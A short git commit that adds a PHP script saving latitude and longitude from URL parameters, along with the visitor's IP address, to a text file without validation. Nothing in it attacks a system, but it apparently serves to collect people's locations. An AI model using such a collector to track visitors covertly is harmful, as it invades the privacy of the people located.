9d0cd1784656744c2384fb7dde740040a36761a8
lahssiki <anaslahssiki@gmail.com>
2023-10-15 17:37:10 +0100

    v1

---
+++ save_location.php
@@ -0,0 +1,6 @@
+<?php
+$my_file = fopen("location.txt","w");
+$information = "lat: " . $_GET["lat"] ."\nlong: ". $_GET["long"] . "\nip: " . $_SERVER["REMOTE_ADDR"];
+fwrite($my_file, $information);
+fclose($my_file);
+?>
